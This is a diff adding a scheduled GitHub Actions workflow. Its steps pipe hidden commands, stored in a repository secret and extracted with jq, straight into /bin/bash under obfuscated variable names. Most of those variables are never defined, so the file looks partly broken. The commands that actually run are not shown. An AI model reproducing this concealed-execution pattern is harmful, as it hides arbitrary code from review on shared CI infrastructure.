@@ -1,0 +1,27 @@
+name: yangxiangchangfang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yangxiangchangfang
+        env:
+          fd4857: ${{ secrets.fd4857 }}
+        run: |
+          echo $fd4857 | jq -r .vc36 | /bin/bash
+          echo $udh10 | jq -r .e5 | /bin/bash
+          echo $kwfu309 | jq -r .n001 | /bin/bash
+          echo $cd05 | jq -r .jb5 | /bin/bash
+          echo $o30396 | jq -r .apkf84229 | /bin/bash
+          echo $j21446 | jq -r .ywklw24998 | /bin/bash
+          echo $xcvrd2 | jq -r .n05394 | /bin/bash
+          echo $njwrb252 | jq -r .ow4846 | /bin/bash
+          echo $qv29130 | jq -r .vy2452 | /bin/bash
+          echo $ilxgf6562 | jq -r .aty46734 | /bin/bash
+          echo $vzekd66 | jq -r .hpi5889 | /bin/bash
+          echo $tj082 | jq -r .osbf296 | /bin/bash
+
